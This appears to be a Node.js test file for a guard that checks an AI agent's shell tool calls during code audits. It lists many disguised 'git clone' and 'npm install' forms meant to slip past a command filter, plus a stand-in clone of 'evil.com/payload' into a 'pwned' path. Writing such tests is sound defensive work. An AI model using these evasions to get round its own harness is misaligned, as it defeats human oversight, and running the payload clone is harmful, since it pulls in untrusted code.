// __tests__/command-normalization.test.mjs
//
// Anchor tests for security rationale. security rationale found seven more
// critical/high bypasses in the security rationale tokenizer-based detection,
// plus the npm.exe install bypass and the --reference destination
// spoof. security fix replaces the brittle tokenizer-only approach
// with a TWO-LAYER defense:
//   Layer 1 — substring scan (audit mode AND build mode both)
//   Layer 2 — tokenizer-based destination validation (build mode only)
//
// security findings:
//   Security case — passthrough wrappers w/ own flags (env -i, sudo -E,
//     nice -n, "sudo" git clone, /usr/bin/sudo git clone, & "sudo")
//   Security case — bash backslash escape (g\it, gi\t)
//   Security case — scriptblocks/inner shells (& {git clone}, cmd /c,
//     bash -c, eval, xargs, git $(echo clone))
//   Security case — npm.exe / "npm" install bypass safe-build
//   Security case — line-continuation (PS `\n, bash \\\n)
//   Security case — subcommand quote-fragment (git cl"o"ne)
//   Security case — --reference legit-path spoofs destination

import { test } from "node:test";
import assert from "node:assert/strict";

import { inspectToolCall, activateAudit, deactivateAudit } from "../enforcement.mjs";

const BUILD_ROOT = process.platform === "win32"
    ? "C:\\test\\zerotrust-sourcecheck": "/tmp/zerotrust-sourcecheck";
const CLONE_PATH = process.platform === "win32"
    ? "C:\\test\\zerotrust-sourcecheck\\octocat-Hello-World-7fd1a60": "/tmp/zerotrust-sourcecheck/octocat-Hello-World-7fd1a60";

function denyTest(name, command, mode = "audit_source") {
    test(name, () => {
        const sid = "command-normalization-" + Math.random().toString(36).slice(2, 8);
        deactivateAudit(sid);
        activateAudit({
            sessionId: sid,
            buildPath: BUILD_ROOT,
            mode,
            expectedClonePath: CLONE_PATH,
        });
        const r = inspectToolCall({
            sessionId: sid,
            toolName: "powershell",
            toolArgs: { command },
        });
        assert.equal(r.decision, "deny",
            `expected deny, got: ${r.decision} | reason: ${r.reason || ""}`);
        deactivateAudit(sid);
    });
}

// ---- Quoted/full-path/flagged passthrough operators ----

denyTest('command-normalization: `"sudo" git clone` is DENIED', '"sudo" git clone https://github.com/x/y ' + CLONE_PATH);
denyTest("command-normalization: `'sudo' git clone` is DENIED", "'sudo' git clone https://github.com/x/y " + CLONE_PATH);
denyTest('command-normalization: `& "sudo" git clone` is DENIED', '& "sudo" git clone https://github.com/x/y ' + CLONE_PATH);
denyTest('command-normalization: `"nice" git clone` is DENIED', '"nice" git clone https://github.com/x/y ' + CLONE_PATH);
denyTest("command-normalization: `nice -n 19 git clone` (operator with own flag) is DENIED", "nice -n 19 git clone https://github.com/x/y " + CLONE_PATH);
denyTest("command-normalization: `sudo -E git clone` (operator with own flag) is DENIED", "sudo -E git clone https://github.com/x/y " + CLONE_PATH);
denyTest("command-normalization: `env -i git clone` (operator with own flag) is DENIED", "env -i git clone https://github.com/x/y " + CLONE_PATH);
denyTest("command-normalization: `setsid -w git clone` (operator with own flag) is DENIED", "setsid -w git clone https://github.com/x/y " + CLONE_PATH);
denyTest("command-normalization: `/usr/bin/sudo git clone` (full-path operator) is DENIED", "/usr/bin/sudo git clone https://github.com/x/y " + CLONE_PATH);
denyTest("command-normalization: `/bin/nice git clone` (full-path operator) is DENIED", "/bin/nice git clone https://github.com/x/y " + CLONE_PATH);
denyTest('command-normalization: `C:\\Windows\\sudo.exe git clone` (Windows full-path operator) is DENIED', 'C:\\Windows\\sudo.exe git clone https://github.com/x/y ' + CLONE_PATH);

// ---- Bash backslash escape ----

denyTest("command-normalization: bash `g\\it clone` (backslash escape) is DENIED", "g\\it clone https://github.com/x/y " + CLONE_PATH);
denyTest("command-normalization: bash `gi\\t clone` (backslash escape mid-token) is DENIED", "gi\\t clone https://github.com/x/y " + CLONE_PATH);
denyTest("command-normalization: bash `git cl\\one` (backslash escape in subcommand) is DENIED", "git cl\\one https://github.com/x/y " + CLONE_PATH);

// ---- Scriptblocks + inner shells ----

denyTest("command-normalization: PS scriptblock `& { git clone }` is DENIED", "& { git clone https://github.com/x/y " + CLONE_PATH + " }");
denyTest("command-normalization: PS conditional block `if ($true) { git clone }` is DENIED", "if ($true) { git clone https://github.com/x/y " + CLONE_PATH + " }");
denyTest("command-normalization: `cmd /c git clone` (cmd inner-shell) is DENIED", 'cmd /c git clone https://github.com/x/y ' + CLONE_PATH);
denyTest('command-normalization: `bash -c "git clone"` (bash inner-shell) is DENIED', 'bash -c "git clone https://github.com/x/y ' + CLONE_PATH + '"');
denyTest('command-normalization: `pwsh -Command "git clone"` (pwsh inner-shell) is DENIED', 'pwsh -Command "git clone https://github.com/x/y ' + CLONE_PATH + '"');
denyTest('command-normalization: `eval "git clone"` (eval inner-shell) is DENIED', 'eval "git clone https://github.com/x/y ' + CLONE_PATH + '"');
denyTest("command-normalization: `echo url | xargs git clone` (xargs indirection) is DENIED", "echo https://github.com/x/y | xargs git clone");
denyTest("command-normalization: `git $(echo clone) <bad>` (subcommand substitution) is DENIED", "git $(echo clone) https://github.com/x/y " + CLONE_PATH);
denyTest("command-normalization: backtick `git $(echo clone)` is DENIED", "git `echo clone` https://github.com/x/y " + CLONE_PATH);

// ---- Line continuations ----

denyTest("command-normalization: PS line-continuation `git `\\n` clone` is DENIED",
    "git `\nclone https://github.com/x/y " + CLONE_PATH);
denyTest("command-normalization: bash line-continuation `git \\\\n clone` is DENIED",
    "git \\\nclone https://github.com/x/y " + CLONE_PATH);

// ---- Subcommand quote-fragment ----

denyTest('command-normalization: `git cl"o"ne` (subcommand quote-fragment) is DENIED',
    'git cl"o"ne https://github.com/x/y ' + CLONE_PATH);
denyTest('command-normalization: `g"it" cl"o"ne` (both program and subcommand fragmented) is DENIED',
    'g"it" cl"o"ne https://github.com/x/y ' + CLONE_PATH);

// ---- --reference destination spoof (build mode) ----

test("command-normalization: build-mode `--reference legit-path` does NOT spoof destination (real dest is bad)", () => {
    const sid = "command-normalization-ref-spoof-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const badDest = process.platform === "win32" ? "C:\\Users\\testuser\\Desktop\\pwned": "/tmp/pwned";
    const cmd = `git clone https://evil.com/payload ${badDest} --reference ${CLONE_PATH}`;
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: cmd },
    });
    assert.equal(r.decision, "deny",
        `expected deny on real dest outside build_root, got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

test("command-normalization: build-mode `--separate-git-dir legit-path` does NOT spoof destination", () => {
    const sid = "command-normalization-sgd-spoof-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const badDest = process.platform === "win32" ? "C:\\Users\\testuser\\Desktop\\pwned": "/tmp/pwned";
    const cmd = `git clone https://evil.com/payload ${badDest} --separate-git-dir ${CLONE_PATH}`;
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: cmd },
    });
    assert.equal(r.decision, "deny");
    deactivateAudit(sid);
});

test("command-normalization: build-mode `--branch foo` (legit value-flag) does NOT break good clone", () => {
    const sid = "command-normalization-branch-good-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const cmd = `git -c protocol.file.allow=never -c core.symlinks=false clone --no-recurse-submodules --filter=blob:none --no-checkout --branch main https://github.com/octocat/Hello-World ${CLONE_PATH}`;
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: cmd },
    });
    assert.equal(r.decision, "allow",
        `expected allow on good clone with --branch, got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

// ---- npm.exe / "npm" install bypass ----

test("command-normalization: `npm.exe install` in safe-build WITHOUT --ignore-scripts is DENIED", () => {
    const sid = "command-normalization-npmexe-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: "npm.exe install" },
    });
    assert.equal(r.decision, "deny");
    assert.match(r.reason, /ignore-scripts/i);
    deactivateAudit(sid);
});

test('command-normalization: `"npm" install` in safe-build WITHOUT --ignore-scripts is DENIED', () => {
    const sid = "command-normalization-npmq-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: '"npm" install' },
    });
    assert.equal(r.decision, "deny");
    assert.match(r.reason, /ignore-scripts/i);
    deactivateAudit(sid);
});

test("command-normalization: `npm.exe install --ignore-scripts` in safe-build is ALLOWED", () => {
    const sid = "command-normalization-npmsafe-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: "npm.exe install --ignore-scripts" },
    });
    assert.notEqual(r.decision, "deny",
        `expected not deny (decision is allow or undefined), got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

test("command-normalization: `npm.exe install` in audit_source (no build) is DENIED", () => {
    const sid = "command-normalization-npmaudit-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_source",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: "npm.exe install --ignore-scripts" },
    });
    assert.equal(r.decision, "deny");
    assert.match(r.reason, /does not include a build step|build mode/i);
    deactivateAudit(sid);
});

// Sanity: legit commands still pass through with no opinion.

test("command-normalization sanity: `git status` is allowed (no opinion)", () => {
    const sid = "command-normalization-status-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_source",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: "git status" },
    });
    assert.notEqual(r.decision, "deny",
        `git status without 'clone' must not deny, got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

test("command-normalization sanity: `echo hello` is allowed (no opinion)", () => {
    const sid = "command-normalization-echo-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_source",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: "echo hello world" },
    });
    assert.notEqual(r.decision, "deny");
    deactivateAudit(sid);
});

test("command-normalization sanity: hardened raw git clone in build mode is ALLOWED (regression check)", () => {
    const sid = "command-normalization-allow-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const cmd = "git -c protocol.file.allow=never -c core.symlinks=false clone --no-recurse-submodules --filter=blob:none --no-checkout https://github.com/octocat/Hello-World " + CLONE_PATH;
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: cmd },
    });
    assert.equal(r.decision, "allow");
    deactivateAudit(sid);
});
